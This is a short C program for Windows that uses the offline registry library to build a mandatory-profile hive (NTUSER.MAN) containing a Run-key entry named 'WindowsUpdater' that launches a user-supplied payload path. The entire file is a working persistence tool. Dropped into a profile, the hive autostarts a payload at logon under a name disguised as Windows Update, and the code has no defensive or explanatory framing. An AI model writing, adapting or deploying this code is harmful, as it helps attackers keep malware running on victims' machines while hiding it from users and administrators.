#include <windows.h>
#include <stdio.h>

typedef PVOID ORHKEY;
typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
typedef LONG (WINAPI* pORCreateKey)(ORHKEY, LPCWSTR, LPCWSTR, DWORD, REGSAM, PVOID, ORHKEY*, LPDWORD);
typedef LONG (WINAPI* pORSetValue)(ORHKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI* pORSaveHive)(ORHKEY, LPCWSTR, DWORD, DWORD);

BOOL InitOffreg(HMODULE* phMod, pORCreateHive* pCreateHive, pORCreateKey* pCreateKey, pORSetValue* pSetValue, pORSaveHive* pSaveHive) {
    *phMod = LoadLibraryA("offreg.dll");
    if (!*phMod) *phMod = LoadLibraryA("C:\\Windows\\SysWOW64\\offreg.dll");
    if (!*phMod) *phMod = LoadLibraryA("C:\\Windows\\System32\\offreg.dll");
    if (!*phMod) return FALSE;

    *pCreateHive = (pORCreateHive)GetProcAddress(*phMod, "ORCreateHive");
    *pCreateKey  = (pORCreateKey)GetProcAddress(*phMod, "ORCreateKey");
    *pSetValue   = (pORSetValue)GetProcAddress(*phMod, "ORSetValue");
    *pSaveHive   = (pORSaveHive)GetProcAddress(*phMod, "ORSaveHive");

    if (!*pCreateHive || !*pCreateKey || !*pSetValue || !*pSaveHive) return FALSE;
    return TRUE;
}

void GetRealOsVersion(DWORD* pMajor, DWORD* pMinor) {
    typedef LONG (WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RTL_OSVERSIONINFOW osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion && pRtlGetVersion(&osvi) == 0) {
            *pMajor = osvi.dwMajorVersion;
            *pMinor = osvi.dwMinorVersion;
            return;
        }
    }
    *pMajor = 6; *pMinor = 1;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <payload_path> <output_ntuser_man>\n", argv[0]);
        return 1;
    }

    WCHAR payloadPath[MAX_PATH];
    WCHAR outputPath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, payloadPath, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, argv[2], -1, outputPath, MAX_PATH);

    HMODULE hMod;
    pORCreateHive CreateHive;
    pORCreateKey CreateKey;
    pORSetValue SetValue;
    pORSaveHive SaveHive;

    if (!InitOffreg(&hMod, &CreateHive, &CreateKey, &SetValue, &SaveHive)) {
        printf("[-] Failed to load offreg.dll.\n");
        return 1;
    }

    DWORD osMajor, osMinor;
    GetRealOsVersion(&osMajor, &osMinor);
    printf("[*] Detected OS version: %lu.%lu\n", osMajor, osMinor);

    ORHKEY hHive = NULL;
    if (CreateHive(&hHive) != ERROR_SUCCESS) {
        printf("[-] ORCreateHive failed.\n");
        return 1;
    }

    LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName  = L"WindowsUpdater";

    ORHKEY hKey = NULL;
    DWORD dwDisposition;
    
    if (CreateKey(hHive, runKeyPath, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        printf("[-] ORCreateKey failed.\n");
        return 1;
    }

    if (SetValue(hKey, valueName, 0, REG_SZ, (const BYTE*)payloadPath, (DWORD)((wcslen(payloadPath) + 1) * sizeof(WCHAR))) != ERROR_SUCCESS) {
        printf("[-] ORSetValue failed.\n");
        return 1;
    }

    if (SaveHive(hHive, outputPath, osMajor, osMinor) != ERROR_SUCCESS) {
        printf("[-] ORSaveHive failed.\n");
        return 1;
    }

    printf("[+] Successfully generated VALID NTUSER.MAN at: %s\n", argv[2]);
    return 0;
}
